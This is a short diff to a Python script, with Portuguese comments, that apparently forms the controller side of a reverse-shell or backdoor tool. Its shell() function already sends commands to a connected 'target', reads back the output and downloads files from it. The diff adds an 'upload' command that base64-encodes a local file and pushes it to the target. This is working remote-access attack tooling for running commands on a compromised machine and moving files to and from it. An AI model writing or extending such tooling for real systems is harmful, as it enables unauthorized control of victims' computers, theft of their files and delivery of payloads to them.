@@ -32,6 +32,13 @@ def shell():
             with open(command[9:],'wb') as file_download:
                 data=target.recv(30000) # preparar buffer de recepção
                 file_download.write(base64.b64decode(data))
+        elif command[:6]=="upload":
+            try:
+                target.send(command.encode()) # envio do comando au cliente
+                with open(command[7:],'rb') as file_upload:
+                    target.send(base64.b64encode(file_upload.read()))
+            except:
+                print("Acontecio um erro no upload do arquivo")
         else:
             target.send(command.encode())
             res=target.recv(1024).decode().rstrip()
